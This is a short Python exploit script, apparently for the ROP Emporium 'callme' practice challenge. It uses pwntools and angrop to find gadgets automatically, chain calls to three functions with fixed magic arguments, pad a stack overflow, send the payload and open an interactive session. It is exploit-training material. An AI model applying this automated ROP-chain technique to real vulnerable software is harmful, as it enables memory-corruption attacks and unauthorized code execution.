from pwn import *
import angr
import angrop
import logging

logging.getLogger('angr').setLevel(logging.WARNING)
logging.getLogger('angrop').setLevel(logging.WARNING)
logging.getLogger('pwnlib').setLevel(logging.WARNING)

binary = args.BIN

context.terminal = ["tmux", "splitw", "-h"]
e = context.binary = ELF(binary)
r = ROP(e)

gs = '''
continue
'''


def start():
    if args.GDB:
        return gdb.debug(e.path, gdbscript=gs)
    else:
        return process(e.path)


log.warn("Analyzing binary with angr_rop")
angr_p = angr.Project(binary)
rop = angr_p.analyses.ROP()
rop.find_gadgets_single_threaded()

chain = rop.func_call(
    "callme_one", [0xdeadbeefdeadbeef, 0xcafebabecafebabe, 0xd00df00dd00df00d])
chain += rop.func_call("callme_two",
                       [0xdeadbeefdeadbeef, 0xcafebabecafebabe, 0xd00df00dd00df00d])
chain += rop.func_call("callme_three",
                       [0xdeadbeefdeadbeef, 0xcafebabecafebabe, 0xd00df00dd00df00d])

log.warn("callme[1,2,3] chain:\n")
chain.print_payload_code()

padding = r.generatePadding(0, cyclic_find(b'kaaa'))

p = start()
p.recvuntil(b'>')
p.sendline(padding+chain.payload_str())

p.interactive()
